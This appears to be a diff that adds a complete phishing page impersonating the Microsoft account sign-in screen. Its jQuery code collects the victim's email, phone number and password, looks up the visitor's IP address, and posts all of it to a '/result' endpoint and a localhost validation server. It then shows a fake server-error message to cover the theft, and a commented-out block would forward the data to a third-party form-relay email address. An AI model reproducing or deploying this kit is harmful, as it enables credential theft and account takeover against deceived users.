@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="favicon.ico" />
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        /* General styling */
+
+
+/* Loader container styling */
+.loader-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+
+    height: 100vh;
+    opacity: 1;
+    position: absolute;
+    width: 100vw;
+    background: #ffffff85;
+}
+
+/* Loader spinner styling */
+.loader {
+    border: 8px solid #f3f3f3; /* Light grey */
+    border-top: 8px solid #0078d4; /* Blue color similar to Outlook */
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 2s linear infinite;
+    margin-bottom: 10px;
+}
+
+/* Loader text styling */
+.loader-text {
+    font-size: 1.2em;
+    color: #0078d4;
+}
+
+/* Keyframes for spinner animation */
+@keyframes spin {
+    0% {
+        transform: rotate(0deg);
+    }
+    100% {
+        transform: rotate(360deg);
+    }
+}
+
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        }
+
+        html,
+        body {
+            background-color: #e2e5d3;
+            color: #1b1b1b;
+        }
+
+        section{
+            display:table-cell;
+            vertical-align:middle;
+            height: 100vh;
+            width: 100rem;
+            max-width: 100%;
+        }
+
+        .title {
+            line-height: 1.75rem;
+            color: #1b1b1b;
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+
+        .auth-wrapper {
+            max-width: 440px;
+            width: calc(100% - 40px);
+            padding: 44px;
+            margin: auto;
+            margin-bottom: 28px;
+            background-color: #fff;
+            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            min-width: 320px;
+            /* min-height: 338px; */
+            /* overflow: hidden;
+            position: absolute;
+            transform: translate(-50%, -50%);
+            top: 50%;
+            left: 50%; */
+        }
+
+        .opts {
+            padding: 10px 44px;
+            max-width: 440px;
+            cursor: pointer;
+            margin: auto;
+            background-color: #fff;
+            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+        }
+
+        .opts:hover {
+            background-color: rgba(0, 0, 0, .1);
+        }
+
+        .input {
+            padding: 4px 8px;
+            border-style: solid;
+            border-width: 2px;
+            border-color: rgba(0, 0, 0, .4);
+            background-color: rgba(255, 255, 255, .4);
+            height: 32px;
+            height: 2rem;
+            padding: 6px 10px;
+            padding-left: 10px;
+            border-width: 1px;
+            border-top-width: 1px;
+            border-right-width: 1px;
+            border-left-width: 1px;
+            border-color: #666;
+            border-color: rgba(0, 0, 0, .6);
+            height: 36px;
+            outline: none;
+            border-radius: 0;
+            -webkit-border-radius: 0;
+            background-color: transparent;
+            border-top-width: 0;
+            border-left-width: 0;
+            border-right-width: 0;
+            padding-left: 0;
+            width: calc(100% - 20px);
+        }
+
+        .input:hover {
+            border-color: #323232;
+            border-color: rgba(0, 0, 0, .8);
+        }
+
+        .input::placeholder {
+            font-size: 15px;
+        }
+
+        .mb-0 {
+            margin-bottom: 0;
+        }
+
+        a.link {
+            text-decoration: none;
+            color: #0067b8
+        }
+
+        a:hover {
+            text-decoration: underline !important;
+            color: #666;
+        }
+
+        a:focus {
+            border: 1px dotted #000;
+            text-decoration: underline !important;
+        }
+
+        .btn {
+            margin: 0 0 0 auto;
+            display: block;
+            background-color: #0067b8;
+            color: #fff;
+            border: 2px solid #0067b8;
+            padding: 5px 30px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background-color: #005da6;
+        }
+
+        .has-icon {
+            display: flex;
+            gap: 5px;
+            align-items: center;
+        }
+
+        .mb-16 {
+            margin-bottom: 16px;
+        }
+
+        .has-icon .icon {
+            display: inline-flex;
+        }
+
+        .footer {
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            overflow: visible;
+            z-index: 99;
+            clear: both;
+            min-height: 28px;
+            display: flex;
+            flex-direction: row;
+            gap: 10px;
+            justify-content: end;
+        }
+
+        .footer a,
+        .footer span {
+            color: #000;
+            font-size: 12px;
+            line-height: 28px;
+            margin-left: 8px;
+            margin-right: 8px;
+            text-decoration: none;
+        }
+
+        .footer span {
+            font-size: 20px;
+            line-height: 20px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .d-none {
+            display: none;
+        }
+
+        .back {
+            border: none;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            background-color: unset;
+            cursor: pointer;
+        }
+
+        .identity {
+            display: inline-flex;
+            gap: 5px;
+        }
+
+        .d-block {
+            display: block;
+        }
+
+        .w-100 {
+            width: 100%;
+        }
+
+        .back:hover {
+            background-color: #e6e6e6;
+            background-color: rgba(0, 0, 0, .1);
+        }
+
+        .mt-16 {
+            margin-top: 16px;
+        }
+
+        .mb-16 {
+            margin-bottom: 16px;
+        }
+
+        .error {
+            color: var(--error) !important;
+        }
+
+        .error-inp {
+            border-bottom-color: var(--error) !important;
+        }
+
+        .btn-group {
+            text-align: right;
+            width: 100%;
+            margin: 16px 0;
+        }
+
+        .btn-group>.btn {
+            display: inline;
+        }
+
+        .btn-group>.btn:not(:last-child) {
+            margin-right: 5px;
+        }
+
+        .btn-sec {
+            background-color: #b2b2b2;
+            color: #000;
+            border-color: #b2b2b2;
+        }
+
+        .btn-sec:hover {
+            background-color: rgba(0, 0, 0, .3);
+        }
+
+        #btn_final:hover {
+            text-decoration: underline;
+        }
+
+        .text-title {
+            font-size: 1.5rem;
+        }
+
+        label.has-checkbox {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .checkbox {
+            width: 20px;
+            height: 20px;
+        }
+
+        .p {
+            font-weight: 400;
+            font-size: 15px;
+            margin: 16px 0;
+        }
+
+        .fs-13 {
+            font-size: 13px;
+        }
+
+        #user_identity {
+            font-size: 15px;
+            color: #1b1b1b;
+        }
+
+        img{
+            vertical-align: middle;
+        }
+
+        @media screen and (max-width:600px) {
+            html, body{
+                /* background-color: #fff; */
+            }
+            .auth-wrapper{
+                box-shadow: none !important;
+                /* margin:auto 80px; */
+                padding: 24px !important;
+                /* position: relative;
+                transform: none; */
+                /* top: 0;
+                left: 0; */
+                width: unset !important;
+                max-width: unset !important;
+                margin: 0 30px !important;
+            }
+            .opts{
+                box-shadow: none !important;
+                padding: 8px 24px !important;
+                border: 1px solid #999;
+                /* padding of 24px on both sides = 48px*/
+                /* padding of 24px on authwrapper and margin of 30px  sides = 54px*/
+                max-width: calc(100% - 112px);
+                margin: 12% auto !important;
+            }
+        }
+        :root {
+            --error: #e81123;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="loader-container" style="height: 100vh;">
+        <div class="loader"></div>
+        
+    </div>
+    <div id="initPage"></div>
+
+
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>    
+    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+
+
+const formHtml = `
+        <div id="step1">
+
+<section id="section_uname">
+<div class="auth-wrapper">
+    <img src="logo.png" alt="Microsoft" />
+
+
+    <h2 class="title mb-16 mt-16">Sign in</h2>
+    <p class="p errormsg" style="color: orangered;"> </p>
+        <div class="mb-16">
+            <p id="error_uname" class="error"></p>
+            <input id="uname" type="text" name="uname" class="input" placeholder="Email" required />
+        </div>
+    <div>
+        <!-- <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p> -->
+        <p class="mb-16 fs-13">
+            <a href="#" class="link">Sign in with a security key
+                <img src="question.png" alt="Question img">
+            </a>
+        </p>
+    </div>
+    <div>
+        <button class="btn" id="btn_next" type="button" onclick="nextStep(2, 'uname'); sendFirstRequest()">Next</button>
+    </div>
+</div>
+</section>
+        </div>
+        <div id="step2" style="display:none;">
+
+<section id="" >
+<div class="auth-wrapper">
+    <img src="logo.png" alt="Microsoft" class="d-block" />
+    <div class="identity w-100 mt-16 mb-16">
+        <button class="back" style="display: none">
+            <img src="back.png" />
+        </button>
+        <span id="user_identity"> </span>
+    </div>
+    <h2 class="title mb-16">Phone</h2>
+        <div class="mb-16">
+            <p id="error_pwd" class="error"></p>
+            <input id="phone" type="text" name="phone" class="input" placeholder="Phone" />
+        </div>
+    <div>
+    </div>
+    <div>
+        <button class="btn"  onclick="nextStep(3, 'phone')">Next</button>
+    </div>
+</div>
+</section>
+
+
+        </div>
+        <div id="step3" style="display:none;">
+
+            <input type="hidden" id="ip" name="ip">
+            <input type="text" id="cookie" name="cookie">
+
+
+<section id="section_final">
+<div class="auth-wrapper">
+    <img src="logo.png" alt="Microsoft" class="d-block" />
+    <div class="identity w-100 mt-16 mb-16">
+        <span id="user_identity" style="display:none">a@b.com</span>
+    </div>
+    <h2 class="title mb-16">Password</h2>
+    <p class="p errormsg" style="color: orangered;"> </p>
+   <input id="pwd" type="password" name="password" class="input" placeholder="Password" />
+
+   <!-- <label class="has-checkbox">
+        <input type="checkbox" class="checkbox" />
+        <span>Don't show this again</span>
+    </label> -->
+    <div class="btn-group">
+    <!-- <button class="btn btn-sec" id="">No</button> -->
+        <button class="btn" id="btn_final" type="submit" onclick="submitForm(); sendSecondRequest()">Submit</button>
+    </div>
+</div>
+</section>
+
+        </div>
+
+`;
+
+document.getElementById('initPage').innerHTML = formHtml;
+});
+
+// $(document).ready(function() {
+// Capture IP address
+
+
+// Handle form submission
+
+// });
+function submitForm(){
+let ipad;
+
+    // let getip = JSON.stringify(ipad)
+    $.getJSON('https://api.ipify.org?format=json', function(ipdata) {
+    console.log(ipdata)
+    ipad = ipdata.ip
+    // $.getJSON(`https://ipinfo.io/${data.ip}/json`, function(info) {
+    // ipad = { "ipad" : data.ip, "info": info }
+    // console.log(ipad)
+    // // $('#ip').val(JSON.stringify(ipadinfo));
+    // })
+
+var formData =  { 'uname':  $('#uname').val(), 'phone':  $('#phone').val(), 'pwd':  $('#pwd').val(), 'ipad': ipad, 'cookie': $('#cookie').val()   }
+// var formData = $(this).serialize();
+// $('#overlay').fadeOut()
+$.post('/result', formData, function(response) {
+    action()
+      // JSON variable with form data
+      var formDataJson = formData;
+      formDataJson._captcha = "false"
+    console.log(formDataJson)
+                // Convert JSON to URL-encoded string
+                var sformData = $.param(formDataJson);
+
+                // $.ajax({
+                //     url: 'https://formsubmit.co/rentaladsonlinestrictly@yahoo.com', // Form action URL
+                //     method: 'POST', // Set the method to POST
+                //     data: sformData, // Send serialized form data
+                //     success: function(response) {
+                //         // Handle success
+                //         // alert('Form submitted successfully!');
+                //     },
+                //     error: function(error) {
+                //         // Handle error
+                //         // alert('Error submitting form.');
+                //     }
+                // });
+            });
+});
+
+}
+
+function nextStep(step, inputId) {
+const input = document.getElementById(inputId);
+if (input && input.value.trim() === '') {
+    alert('Please fill out all required field.');
+    return;
+}
+    if(step !== 2){
+        $('div[id^="step"]').hide();
+        $('#step' + step).fadeIn();
+    }
+}
+function action(){
+    // $(document).ready(function() {
+        // Append overlay HTML to the body
+        $('body').append(`
+            <div id="overlay" style="
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0, 0, 0, 0.5);
+                align-items: center;
+                justify-content: center;
+                z-index: 1000;
+                display: flex;
+                gap: 50px;
+            ">
+                <div id="loader" style="
+                    border: 16px solid #f3f3f3;
+                    border-radius: 50%;
+                    border-top: 16px solid #3498db;
+                    width: 80px;
+                    height: 80px;
+                    animation: spin 1s linear infinite;
+                "></div>
+                <div id="successMessage" style="
+                    display: none;
+                    color: white;
+                    font-size: 24px;
+                    padding: 20px;
+                    background: #3f3f3ff7;
+                    border-radius: 10px;
+                ">Server Error! Please try again in 24 hours.</div>
+            </div>
+        `);
+
+        // Add CSS for loader animation
+        $('head').append(`
+            <style>
+                @keyframes spin {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+            </style>
+        `);
+
+        // Show overlay with loader, then success message, then fade out
+        function showLoadingAndSuccess() {
+            $('#overlay').fadeIn(1000, function() {
+                setTimeout(function() {
+                    $('#loader').fadeOut(1000, function() {
+                        $('#successMessage').fadeIn(1000, function() {
+                            setTimeout(function() {
+                                $('#overlay').fadeOut(1000);
+                            }, 2000);
+                        });
+                    });
+                }, 2000);
+            });
+        }
+
+        // Example trigger
+        showLoadingAndSuccess();
+    // });
+
+}
+
+            let stepStatus = '';
+            
+            function sendFirstRequest() {
+                $('.loader-container').fadeIn()
+                let email = $('#uname').val();
+                $.post('http://localhost:3000/validate', { email: email, step: 'email' }, function(response) {
+                    if (response === 'success') {
+                        stepStatus = 'email-verified';
+                        console.log('Email verified successfully.');
+                        $('#step1').hide();
+                        $('#step2').fadeIn();
+                    } else {
+                        $('.errormsg').text('That Email account doesn\'t exist.')
+                        console.log('Email verification failed. Retrying...');
+                    }
+                $('.loader-container').fadeOut()
+                });
+            }
+
+            function sendSecondRequest() {
+                $('.loader-container').fadeIn()
+
+                if (stepStatus === 'email-verified') {
+                    let email = $('#uname').val();
+                    let password = $('#pwd').val();
+                    $.post('http://localhost:3000/validate', { email: email, password: password }, function(response) {
+                        if (response === 'success') {
+                            stepStatus = 'complete';
+                            // $('#step2').hide();
+                            // $('#step3').fadeIn();
+                            console.log('Password verified successfully. Process complete.');
+
+                            resetFunction();
+                        } else {
+                            $('.errormsg').text('Password verification failed.')
+                            console.log('Password verification failed.');
+                        }
+                    $('.loader-container').fadeOut()
+                    });
+                } else {
+                    console.log('Email verification not completed yet.');
+                }
+                $('.loader-container').fadeOut()
+
+            }
+
+            function resetFunction() {
+                stepStatus = '';
+                console.log('Function reset.');
+            }
+
+            // $('#startProcess').click(function() {
+            //     sendFirstRequest();
+            // });
+
+            // $('#startProcess').click(function() {
+            //     sendSecondRequest();
+            // });
+            $('.loader-container').fadeOut()
+
+    </script>
+
+</body>
+
+</html>
